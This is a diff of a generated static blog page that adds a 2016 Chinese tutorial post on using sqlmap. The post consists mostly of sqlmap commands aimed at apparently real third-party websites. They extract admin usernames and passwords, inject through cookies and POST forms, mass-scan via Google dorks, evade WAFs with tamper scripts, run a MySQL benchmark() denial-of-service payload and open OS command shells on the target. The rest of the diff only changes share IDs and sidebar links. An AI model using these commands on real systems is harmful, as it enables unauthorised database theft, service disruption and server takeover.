@@ -64,6 +64,171 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sqlmap使用" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="../../2016/06/26/sqlmap使用/" class="article-date">
+  <time datetime="2016-06-26T02:21:00.000Z" itemprop="datePublished">2016-06-26</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="../../categories/WEB/">WEB</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="../../2016/06/26/sqlmap使用/">sqlmap使用</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>SQLMAP注入教程</p>
+<p>#1.SQLMAP用于Access数据库注入#</p>
+<ul>
+<li>(1)猜解是否能注入</li>
+</ul>
+<figure class="highlight plain"><figcaption><span>python sqlmap.py -u "http://www.stronkin.com/en/CompHonorBig.asp?id=7"</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">Linux : ./sqlmap.py -u &quot;http://www.stronkin.com/en/CompHonorBig.asp?id=7&quot;</div></pre></td></tr></table></figure>
+<ul>
+<li>(2)猜解表</li>
+</ul>
+<figure class="highlight plain"><figcaption><span>python sqlmap.py -u "http://www.stronkin.com/en/CompHonorBig.asp?id=7" --tables</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">Linux: ./sqlmap.py -u &quot;http://www.stronkin.com/en/CompHonorBig.asp?id=7&quot;  --tables</div></pre></td></tr></table></figure>
+<ul>
+<li>(3)根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)</li>
+</ul>
+<figure class="highlight plain"><figcaption><span>python sqlmap.py -u "http://www.stronkin.com/en/CompHonorBig.asp?id=7" --columns -T admin</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">Linux: ./sqlmap.py -u &quot;http://www.stronkin.com/en/CompHonorBig.asp?id=7&quot;  --columns -T admin</div></pre></td></tr></table></figure>
+<ul>
+<li>(4)根据字段猜解内容(假如通过3得到字段为username和password)</li>
+</ul>
+<figure class="highlight plain"><figcaption><span>python sqlmap.py -u "http://www.stronkin.com/en/CompHonorBig.asp?id=7" --dump -T admin -C "username,password"</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">Linux: ./sqlmap.py -u &quot;http://www.stronkin.com/en/CompHonorBig.asp?id=7&quot;  --dump -T admin -C</div><div class="line"></div><div class="line">&quot;username,password&quot;</div></pre></td></tr></table></figure>
+<ul>
+<li>2.SQLMAP用于Cookie注入</li>
+</ul>
+<p>(1)cookie注入，猜解表</p>
+<figure class="highlight plain"><figcaption><span>: python sqlmap.py -u "http://www.ntjx.org/jsj/shownews.asp" --cookie "id=31" --table --level 2```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">* (2)猜解字段，(通过1的表猜解字段，假如表为admin)</div><div class="line"></div><div class="line">```win :python sqlmap.py -u &quot;http://www.ntjx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --columns -T</div><div class="line"></div><div class="line">admin --level 2</div></pre></td></tr></table></figure>
+<ul>
+<li>(3)猜解内容</li>
+</ul>
+<figure class="highlight plain"><figcaption><span>:python sqlmap.py -u "http://www.ntjx.org/jsj/shownews.asp" --cookie "id=31" --dump -T</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">admin -C &quot;username,password&quot; --level 2</div></pre></td></tr></table></figure>
+<ul>
+<li><p>3.SQLMAP用于mysql中DDOS攻击</p>
+</li>
+<li><p>(1)获取一个Shell</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">python sqlmap.py -u http://192.168.159.1/news.php?id=1 --sql-shell</div><div class="line"></div><div class="line">Linux:</div><div class="line"></div><div class="line">sqlmap -u http://192.168.159.1/news.php?id=1 --sql-shell</div></pre></td></tr></table></figure>
+<ul>
+<li>(2)输入执行语句完成DDOS攻击</li>
+</ul>
+<figure class="highlight plain"><figcaption><span>benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f)```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">* 4.SQLMAP用于mysql注入</div><div class="line"></div><div class="line">**(1)查找数据库**</div><div class="line"></div><div class="line">```python sqlmap.py -u &quot;http://www.slibrary.com/link.php?id=321&quot; --dbs</div></pre></td></tr></table></figure>
+<ul>
+<li>(2)通过第一步的数据库查找表(假如数据库名为dataname)</li>
+</ul>
+<figure class="highlight python"><figcaption><span>sqlmap.py -u "http://www.slibrary.com/link.php?id=321" -D dataname --tables```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">* (<span class="number">3</span>)通过<span class="number">2</span>中的表得出列名(假如表为table_name)</div><div class="line"></div><div class="line">```python sqlmap.py -u <span class="string">"http://www.slibrary.com/link.php?id=321"</span> -D dataname -T table_name --columns</div></pre></td></tr></table></figure>
+<ul>
+<li>(4)获取字段的值(假如扫描出id,user,password字段)</li>
+</ul>
+<figure class="highlight python"><figcaption><span>sqlmap.py -u "http://www.slibrary.com/link.php?id=321" -D dataname -T table_name -C</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="string">"id,user,password"</span> --dump</div></pre></td></tr></table></figure>
+<ul>
+<li><p>5.SQLMAP中post登陆框注入</p>
+</li>
+<li><p>(1)其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件</p>
+<pre><code>我们在使用Sqlmap进行post型注入时，
+
+经常会出现请求遗漏导致注入失败的情况。
+
+这里分享一个小技巧，即结合burpsuite来使用sqlmap，
+
+用这种方法进行post注入测试会更准确，操作起来也非常容易。        
+
+1. 浏览器打开目标地址http:// www.2cto.com /Login.asp
+
+2. 配置burp代理(127.0.0.1:8080)以拦截请求
+
+3. 点击login表单的submit按钮
+
+4. 如下图，这时候Burp会拦截到了我们的登录POST请求
+
+5. 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下
+
+6. 运行sqlmap并使用如下命令：
+</code></pre></li>
+</ul>
+<p>./sqlmap.py -r search-test.txt -p tfUPass</p>
+<pre><code>这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，
+
+而-p 大家应该比较熟悉，指定注入用的参数。
+</code></pre><p>注入点：<a href="http://testasp.vulnweb.com/Login.asp" target="_blank" rel="external">http://testasp.vulnweb.com/Login.asp</a></p>
+<p>几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass</p>
+<p>(2)自动的搜索</p>
+<p>sqlmap -u <a href="http://testasp.vulnweb.com/Login.asp" target="_blank" rel="external">http://testasp.vulnweb.com/Login.asp</a> –forms</p>
+<p>(3)指定参数搜索</p>
+<p>sqlmap -u <a href="http://testasp.vulnweb.com/Login.asp" target="_blank" rel="external">http://testasp.vulnweb.com/Login.asp</a> –data “tfUName=321&amp;tfUPass=321”</p>
+<p>6.SQLMAP中Google搜索注入</p>
+<p>inurl后面的语言是由自己定的</p>
+<p>注入过程中如果选y是注入，如果不是选n</p>
+<p>sqlmap  -g inurl:php?id=</p>
+<p>7.SQLMAP中的请求延迟</p>
+<p>参数 –delay –safe-freq</p>
+<p>python sqlmap.py –dbs -u “<a href="http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html</a>“ –delay 1</p>
+<p>python sqlmap.py –dbs -u “<a href="http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html</a>“ –safe-freq 3</p>
+<p>参数</p>
+<p>8.SQLMAP绕过WAF防火墙</p>
+<p>注入点:<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="external">http://192.168.159.1/news.php?id=1</a></p>
+<p>sqlmap -u <a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="external">http://192.168.159.1/news.php?id=1</a> -v 3 –dbs  –batch –tamper “space2morehash.py”</p>
+<p>space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py</p>
+<p>都是编码方式</p>
+<p>space2hash.py   base64encode.py charencode.py</p>
+<p>9.SQLMAP查看权限</p>
+<p>sqlmap -u <a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="external">http://192.168.159.1/news.php?id=1</a> –privileges</p>
+<p>10.SQLMAP伪静态注入</p>
+<p>(1)查找数据库</p>
+<p>python sqlmap.py -u “<a href="http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html</a>“ –dbs</p>
+<p>(2)通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)</p>
+<p>python sqlmap.py -u “<a href="http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html</a>“ -D dataname –tables</p>
+<p>(3)通过2中的数据表得到字段(假如得到的是tablename表)</p>
+<p>python sqlmap.py -u “<a href="http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html</a>“ -D dataname -T</p>
+<p>tablename –columns</p>
+<p>(4)通过3得到字段值(假如从3中得到字段id，password)</p>
+<p>python sqlmap.py -u “<a href="http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html</a>“ -D dataname -T</p>
+<p>tablename -C “password” –dump</p>
+<p>11.SQLMAP注入点执行命令与交互写shell</p>
+<p>(1)</p>
+<p>注入点：<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="external">http://192.168.159.1/news.php?id=1</a></p>
+<p>此处采用的是Linux系统</p>
+<p>sqlmap -u <a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="external">http://192.168.159.1/news.php?id=1</a> –os-cmd=ipconfig</p>
+<p>出现语言的选择根据实际的测试网站选择语言</p>
+<p>指定目标站点D:/www/</p>
+<p>(2)获取Shell</p>
+<p>sqlmap -u <a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="external">http://192.168.159.1/news.php?id=1</a> –os-shell</p>
+<p>出现语言的选择根据实际的测试网站选择语言</p>
+<p>指定目标站点D:/www/</p>
+<p>输入ipconfig</p>
+<p>创建用户和删除用户</p>
+<p>只要权限足够大</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/06/26/sqlmap使用/" data-id="cirh40kha000i8whrgt0f035c" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/sqlmap/">sqlmap</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-centos网络配置" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="../../2016/06/14/centos网络配置/" class="article-date">
@@ -104,7 +269,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/06/14/centos网络配置/" data-id="cirh2c56z0001jwhrbyarc5uv" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/06/14/centos网络配置/" data-id="cirh40kfz00018whrmfg5az2o" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/centos/">centos</a></li></ul>
@@ -155,7 +320,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/06/07/虚拟机忘记win2003密码怎么办/" data-id="cirh2c5av001vjwhrxh6tko7k" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/06/07/虚拟机忘记win2003密码怎么办/" data-id="cirh40kjw00218whrk9y891sr" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/win2003/">win2003</a></li></ul>
@@ -206,7 +371,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/06/01/关于tcp-ip安全问题/" data-id="cirh2c5a1001gjwhrcaa51xyb" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/06/01/关于tcp-ip安全问题/" data-id="cirh40kj1001l8whrg0v1dkn6" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/tcp-ip/">tcp/ip</a></li></ul>
@@ -289,7 +454,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/06/01/mysql总结/" data-id="cirh2c57t000djwhr03zac4b9" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/06/01/mysql总结/" data-id="cirh40kgv000d8whrohq8mqg2" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/mysql/">mysql</a></li></ul>
@@ -375,7 +540,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/05/30/linux总结/" data-id="cirh2c583000gjwhrykn2gt8c" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/05/30/linux总结/" data-id="cirh40kgv000a8whr5d98p0s8" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/linux问题/">linux问题</a></li></ul>
@@ -443,7 +608,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/05/14/github/" data-id="cirh2c57j0007jwhroo6jaitg" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/05/14/github/" data-id="cirh40kgf00058whreuvzc7fc" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/github/">github</a></li></ul>
@@ -478,7 +643,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="../../tags/centos/">centos</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/csrf/">csrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/github/">github</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/google/">google</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/linux问题/">linux问题</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/mysql/">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/sqlmap/">sqlmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/tcp-ip/">tcp/ip</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/win2003/">win2003</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/上传/">上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/执行/">执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/敏感信息/">敏感信息</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/文件包含/">文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/流程/">流程</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/逻辑/">逻辑</a></li></ul>
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="../../tags/centos/">centos</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/csrf/">csrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/github/">github</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/google/">google</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/linux问题/">linux问题</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/mysql/">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/redis/">redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/sqlmap/">sqlmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/tcp-ip/">tcp/ip</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/win2003/">win2003</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/上传/">上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/执行/">执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/敏感信息/">敏感信息</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/文件包含/">文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/流程/">流程</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/逻辑/">逻辑</a></li></ul>
     </div>
   </div>
 
@@ -488,7 +653,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="../../tags/centos/" style="font-size: 16.67px;">centos</a> <a href="../../tags/csrf/" style="font-size: 10px;">csrf</a> <a href="../../tags/github/" style="font-size: 10px;">github</a> <a href="../../tags/google/" style="font-size: 10px;">google</a> <a href="../../tags/linux问题/" style="font-size: 10px;">linux问题</a> <a href="../../tags/mysql/" style="font-size: 10px;">mysql</a> <a href="../../tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="../../tags/sql注入/" style="font-size: 20px;">sql注入</a> <a href="../../tags/tcp-ip/" style="font-size: 10px;">tcp/ip</a> <a href="../../tags/win2003/" style="font-size: 10px;">win2003</a> <a href="../../tags/xss/" style="font-size: 13.33px;">xss</a> <a href="../../tags/上传/" style="font-size: 13.33px;">上传</a> <a href="../../tags/执行/" style="font-size: 13.33px;">执行</a> <a href="../../tags/敏感信息/" style="font-size: 10px;">敏感信息</a> <a href="../../tags/文件包含/" style="font-size: 10px;">文件包含</a> <a href="../../tags/流程/" style="font-size: 10px;">流程</a> <a href="../../tags/逻辑/" style="font-size: 10px;">逻辑</a>
+      <a href="../../tags/centos/" style="font-size: 16.67px;">centos</a> <a href="../../tags/csrf/" style="font-size: 10px;">csrf</a> <a href="../../tags/github/" style="font-size: 10px;">github</a> <a href="../../tags/google/" style="font-size: 10px;">google</a> <a href="../../tags/linux问题/" style="font-size: 10px;">linux问题</a> <a href="../../tags/mysql/" style="font-size: 10px;">mysql</a> <a href="../../tags/redis/" style="font-size: 10px;">redis</a> <a href="../../tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="../../tags/sql注入/" style="font-size: 20px;">sql注入</a> <a href="../../tags/tcp-ip/" style="font-size: 10px;">tcp/ip</a> <a href="../../tags/win2003/" style="font-size: 10px;">win2003</a> <a href="../../tags/xss/" style="font-size: 13.33px;">xss</a> <a href="../../tags/上传/" style="font-size: 13.33px;">上传</a> <a href="../../tags/执行/" style="font-size: 13.33px;">执行</a> <a href="../../tags/敏感信息/" style="font-size: 10px;">敏感信息</a> <a href="../../tags/文件包含/" style="font-size: 10px;">文件包含</a> <a href="../../tags/流程/" style="font-size: 10px;">流程</a> <a href="../../tags/逻辑/" style="font-size: 10px;">逻辑</a>
     </div>
   </div>
 
@@ -510,6 +675,10 @@
       <ul>
         
           <li>
+            <a href="../../2016/08/05/redis的安装/">redis的安装</a>
+          </li>
+        
+          <li>
             <a href="../../2016/08/05/centos6-5samba服务器的搭建/">centos6.5samba服务器的搭建</a>
           </li>
         
@@ -523,10 +692,6 @@
         
           <li>
             <a href="../../2016/07/30/文件包含漏洞/">文件包含漏洞</a>
-          </li>
-        
-          <li>
-            <a href="../../2016/07/30/任意代码执行漏洞/">任意代码执行漏洞</a>
           </li>
         
       </ul>
